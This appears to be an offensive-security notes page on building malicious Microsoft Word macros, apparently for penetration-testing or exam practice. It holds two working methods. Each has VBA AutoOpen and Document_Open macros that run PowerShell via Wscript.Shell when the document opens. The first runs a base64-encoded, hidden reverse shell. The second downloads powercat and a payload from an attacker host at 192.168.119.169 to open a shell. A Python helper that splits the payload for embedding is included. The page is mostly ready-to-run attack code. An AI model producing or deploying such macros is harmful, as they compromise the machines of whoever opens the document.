---
description: >-
  Credit:
  https://cel1s0.gitbook.io/offsec-notes/readme/windows/office-macro/microsoft-office
---

# Microsoft Office

## Method 1



Choose VIEW ribbon and selecting Macros option. We type name for the macro and in the MACROS in drop-down menu, select the name of document, then the macro will be add. When we click create, a simple macro framework will be add into our document. We have to save the document as either .docm or the older .doc format. They support embedded macros, .docx format does not.

{% embed url="https://www.revshells.com/" %}

![](<../../../.gitbook/assets/image (10) (1).png>)

We have to edit the payload. We change related part of payload variable.&#x20;

```python
#!/usr/bin/python

payload = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."

n=50

for i in range(0, len(payload), n):
	print "Str = Str + " + '"' + payload[i:i+n] + '"'
```

```vba
Sub AutoOpen()
    Evil
End Sub

Sub Document_Open()
    Evil
End Sub
s
Sub Evil()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACI"
    Str = Str + "ALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAa"
    Str = Str + "QBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB"
    Str = Str + "5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2A"
    Str = Str + "DUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGk"
    Str = Str + "AIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAe"
    Str = Str + "QB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgB"
    Str = Str + "nAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhA"
    Str = Str + "CAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHA"
    Str = Str + "AZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQ"
    Str = Str + "QBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB"
    Str = Str + "0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApA"
    Str = Str + "DsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQ"
    Str = Str + "AZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAc"
    Str = Str + "gBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQA"
    Str = Str + "gACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgA"
    Str = Str + "CsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACI"
    Str = Str + "AOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAd"
    Str = Str + "AAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQA"
    Str = Str + "uAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrA"
    Str = Str + "DIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHM"
    Str = Str + "AZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZ"
    Str = Str + "QAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgB"
    Str = Str + "sAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvA"
    Str = Str + "HMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub
```

## Method 2

{% embed url="https://medium.com/@minix9800/ms-word-macros-with-powercat-reverse-shell-58b20983e0f0" %}

```python
LHOST=192.168.119.169
LPORT=443
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > revshell.txt
```

You should have an encoded payload.

Now

1. Create a document
2. Go to view and macros
3. Make a name for your macro and make sure it's used for this specific document that you will be using. Now click `Create`

Now copy and paste this into the VBA editor

```vba
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String
Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.119.169/revshell.txt'); iex 'powershell -E $code'"""
CreateObject("Wscript.Shell").Run Str
End Sub
```
